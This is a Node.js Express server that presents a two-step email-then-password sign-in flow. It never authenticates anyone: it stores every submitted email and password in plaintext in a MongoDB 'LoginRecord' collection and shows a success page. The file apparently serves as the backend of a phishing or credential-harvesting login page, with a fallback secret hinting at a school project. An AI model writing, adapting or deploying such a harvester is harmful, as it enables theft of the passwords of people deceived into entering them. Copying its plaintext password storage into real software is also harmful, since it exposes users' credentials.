require("dotenv").config();
const path = require("path");
const express = require("express");
const session = require("express-session");
const mongoose = require("mongoose");

const app = express();
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;

const loginRecordSchema = new mongoose.Schema(
  {
    email: { type: String, required: true, trim: true, lowercase: true },
    password: { type: String, required: true },
  },
  { timestamps: true }
);

const LoginRecord = mongoose.models.LoginRecord || mongoose.model("LoginRecord", loginRecordSchema);

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

app.use(express.urlencoded({ extended: true }));
app.use(
  session({
    secret: process.env.SESSION_SECRET || "school-project-secret",
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 10 * 60 * 1000 },
  })
);
app.use(express.static(path.join(__dirname, "public")));

let dbPromise;

function connectToDatabase() {
  if (!MONGO_URI) {
    throw new Error("MONGO_URI is missing.");
  }

  if (mongoose.connection.readyState === 1) {
    return Promise.resolve();
  }

  if (!dbPromise) {
    dbPromise = mongoose
      .connect(MONGO_URI, {
        serverSelectionTimeoutMS: 7000,
      })
      .then(() => {
        console.log("MongoDB connected");
      })
      .catch((error) => {
        dbPromise = null;
        throw error;
      });
  }

  return dbPromise;
}

app.get("/", (req, res) => {
  res.render("index", { error: null, email: "" });
});

app.post("/next", (req, res) => {
  const email = (req.body.email || "").trim();

  if (!email || !email.includes("@")) {
    return res.status(400).render("index", {
      error: "Please enter a valid email.",
      email,
    });
  }

  req.session.pendingEmail = email;
  return res.redirect("/password");
});

app.get("/password", (req, res) => {
  const email = req.session.pendingEmail;
  if (!email) {
    return res.redirect("/");
  }

  return res.render("password", { error: null, email });
});

app.post("/signin", async (req, res) => {
  const email = req.session.pendingEmail;
  const password = (req.body.password || "").trim();

  if (!email) {
    return res.redirect("/");
  }

  if (!password) {
    return res.status(400).render("password", {
      error: "Please enter your password.",
      email,
    });
  }

  try {
    await connectToDatabase();
    await LoginRecord.create({ email, password });
    req.session.pendingEmail = null;
    return res.render("success", { email });
  } catch (error) {
    console.error("MongoDB save failed:", error.message);
    return res.status(500).render("password", {
      error: "Unable to save data to database. Check MongoDB connection.",
      email,
    });
  }
});

if (require.main === module) {
  const startServer = (port) => {
    const server = app
      .listen(port, () => {
        console.log(`Server running at http://localhost:${port}`);
      })
      .on("error", (error) => {
        if (error.code === "EADDRINUSE") {
          const nextPort = Number(port) + 1;
          console.warn(`Port ${port} is busy. Trying ${nextPort}...`);
          startServer(nextPort);
          return;
        }

        console.error("Server failed to start:", error.message);
        process.exit(1);
      });

    return server;
  };

  startServer(Number(PORT));
}

module.exports = app;
